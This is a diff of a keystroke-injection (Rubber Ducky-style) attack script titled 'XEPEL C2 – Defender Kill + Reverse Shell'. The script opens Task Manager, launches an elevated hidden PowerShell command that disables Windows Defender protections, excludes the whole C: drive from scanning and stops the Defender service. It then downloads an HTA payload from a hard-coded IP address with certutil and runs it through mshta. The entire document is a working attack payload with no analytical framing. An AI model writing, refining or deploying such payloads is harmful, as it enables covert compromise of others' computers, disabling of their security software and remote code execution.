@@ -1,34 +1,36 @@
-REM XEPEL C2 – Defender Kill + Reverse Shell
-REM Task Manager entry, no Run dialog
-REM Windows 10/11
+REM XEPEL C2 – CLEANEST FINAL VERSION
+REM GUI d forces desktop focus every time
+REM CTRL+SHIFT+ESC opens Task Manager directly
+REM No browser interference possible
 
+DELAY 5000
+
+REM ── Step 1: Force desktop focus ──
+GUI d
+DELAY 1500
+
+REM ── Step 2: Open Task Manager directly ──
+CTRL+SHIFT+ESC
 DELAY 3000
 
-REM ── Open Task Manager ──
-CTRL+SHIFT+ESC
-DELAY 2000
+REM ── Step 3: Expand if in compact mode ──
+ALT+d
+DELAY 800
 
-REM ── File > Run new task ──
+REM ── Step 4: Open run dialog via File menu ──
 ALT+f
 DELAY 800
 STRING r
-DELAY 1200
+DELAY 1500
 
-REM ── Launch elevated cmd ──
-STRING cmd
-DELAY 400
+REM ── Step 5: Check create as administrator ──
 ALT+c
-DELAY 400
+DELAY 600
+
+REM ── Step 6: Kill Defender + fetch + execute ──
+STRING powershell -w hidden -ep bypass -c "Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableBehaviorMonitoring $true -DisableScriptScanning $true -DisableBlockAtFirstSeen $true -MAPSReporting 0 -SubmitSamplesConsent 0; Add-MpPreference -ExclusionPath 'C:\'; Stop-Service WinDefend -Force; Set-Service WinDefend -StartupType Disabled; Stop-Process -Name MsMpEng -Force; certutil -urlcache -split -f http://153.75.82.198/s.hta C:\Windows\Temp\s.hta; mshta C:\Windows\Temp\s.hta"
+DELAY 500
+
+REM ── Step 7: Execute ──
 ENTER
 DELAY 2000
-
-REM ── UAC accept ──
-ALT+y
-DELAY 2000
-
-REM ── Kill Defender + Download + Execute ──
-STRING powershell -w hidden -ep bypass -c "Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -MAPSReporting Disabled -SubmitSamplesConsent NeverSend; Add-MpPreference -ExclusionPath 'C:\'; Stop-Service WinDefend -Force; Set-Service WinDefend -StartupType Disabled; certutil -urlcache -split -f http://YOUR_VPS_IP/s.hta C:\Windows\Temp\s.hta; mshta C:\Windows\Temp\s.hta"
-ENTER
-DELAY 1000
-STRING exit
-ENTER
